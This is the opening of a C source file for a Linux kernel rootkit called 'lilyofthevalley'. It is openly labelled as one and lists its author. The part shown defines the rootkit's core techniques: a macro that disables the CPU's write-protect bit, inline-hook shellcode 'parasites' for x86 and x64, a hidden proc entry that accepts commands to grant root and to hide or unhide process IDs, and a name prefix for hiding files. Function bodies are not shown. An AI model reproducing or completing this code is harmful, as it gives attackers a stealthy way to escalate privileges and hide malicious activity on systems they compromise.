#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/slab.h>
#include <linux/proc_fs.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/sched.h>
#include <linux/list.h>
#include <linux/uaccess.h>
#include <linux/cred.h>
#include <linux/version.h>




MODULE_LICENSE("GPL");
MODULE_AUTHOR("Mostafa Algayar");



/*
#############################
macro fucntions && constants  	   
#############################
*/


#define MIN(x,y) ((x) < (y) ? (x) : (y))


//clear the WP (write protect) bit in cr0 reg, so cpu can write to readonly pages whilst in ring0 
#define unprotect_memory()	(write_cr0(read_cr0() & (~0x10000)))

#define protect_memory() 	(write_cr0(read_cr0() | 0x10000))



/*
rootkit should hide any file in the root filesystem 
which have this string prepended to it's name 
examples: rtkit_dir rtkit_testfile etc ...
*/
#define R00TKIT_NAME 	"lilyofthevalley"
#define R00TKIT_NAMELEN 0xf


/*
#name of the rootkit's proc filesystem entry
#permissions of rootkit's proc filesystem entry
*/		
#define R00TKIT_PROCFS_ENTRYNAME  "lilyofthevalleyr00tkit"
#define R00TKIT_PROCFS_ENTRYPERM  0666


/*
rootkit's commands 
*/
#define GIVEROOTPERM_CMD "givemerootprivileges"
#define HIDEPID_CMD 	 "hidepid"
#define UNHIDEPID_CMD 	 "unhidepid"

#define HIDEPID_CMD_LEN 	0x7
#define UNHIDEPID_CMD_LEN 	0x9


//maximum len for an pid stored in string format is 7 bytes and one byte for string termination 
//given that the maxiumum value can be set up to (2**22)
#define PID_STR_MAXLEN 0x8



/*
*********
PARASITES
*********
*/
#define INSTALL_PARASITE 	1
#define REMOVE_PARASITE 	!INSTALL_PARASITE

#if defined(__i386__)
/*
\x68\x00\x00\x00\x00\xc3

push memory_address
ret
*/
#define PARASITE		"\x68\x00\x00\x00\x00\xc3" 
#define PARASITE_LEN		0x6
#define PARASITE_ADDROFF	0x1 

#else
/*
\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0

mov rax,memory_address
jmp rax
*/
#define PARASITE		"\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0"
#define PARASITE_LEN		0xc
#define PARASITE_ADDROFF	0x2


#endif


/*
#########################
some structs declarations
#########################
*/

struct r00tkit_dircontext
{
	filldir_t actor;
	loff_t pos;
};



struct hooked_function_info
{
	void *hooked_function_addr;
	struct list_head hook_list;
	char org_code[PARASITE_LEN];
	char parasite[PARASITE_LEN];
};



struct hidden_pids
{
	struct list_head pids_list;
	char pidstr[PID_STR_MAXLEN];
};


/*
proc_dir_entry structure is not declared in proc_fs.h starting with kernel version 3.10.
the structure differs a bit between newer kernel versions
*/

//for 4.X
//copied from /fs/proc/internal.h 
struct proc_dir_entry {
	unsigned int low_ino;
	umode_t mode;
	nlink_t nlink;
	kuid_t uid;
	kgid_t gid;
	loff_t size;
	const struct inode_operations *proc_iops;
	const struct file_operations *proc_fops;
	struct proc_dir_entry *parent;
	struct rb_root subdir;
	struct rb_node subdir_node;
	void *data;
	atomic_t count;		/* use count */
	atomic_t in_use;	/* number of callers into module in progress; */
			/* negative -> it's going away RSN */
	struct completion *pde_unload_completion;
	struct list_head pde_openers;	/* who did ->open, but not ->release */
	spinlock_t pde_unload_lock; /* proc_fops checks and pde_users bumps */
	u8 namelen;
	char name[];
};



/*
###########
prototypes
###########
*/


static int r00tkit_procfs_inlinehook_iterate(struct file *,struct dir_context *);
static int r00tkit_rootfs_inlinehook_iterate(struct file *,struct dir_context *);


static int r00tkit_procfs_filldir(void *,const char *,int,loff_t,u64,unsigned int);
static int r00tkit_rootfs_filldir(void *,const char *,int,loff_t,u64,unsigned int);


static int 	r00tkit_procfs_entry_init(void);
static ssize_t 	r00tkit_procfs_write(struct file *,const char __user *,size_t,loff_t*);
static ssize_t  r00tkit_procfs_read(struct file *,char __user *,size_t,loff_t *); 

//static void 	r00tkit_pid2str(int,struct hidden_pids *);
static int 	r00tkit_hide_pid(const char *,size_t);
static int  	r00tkit_unhide_pid(const char *,size_t);


static int 	r00tkit_hooklist_add(void *,void *);
static void 	r00tkit_parasite(void *,unsigned char);
static int 	r00tkit_do_hook(void);
static void 	r00tkit_undo_hook(void);	

static void 	r00tkit_hide(void);



/*
#################
function pointers
#################
*/

static int (*org_procfs_iterate)(struct file *fp,struct dir_context *ctx);
static int (*org_rootfs_iterate)(struct file *fp,struct dir_context *ctx);

static filldir_t org_procfs_filldir;
static filldir_t org_rootfs_filldir;
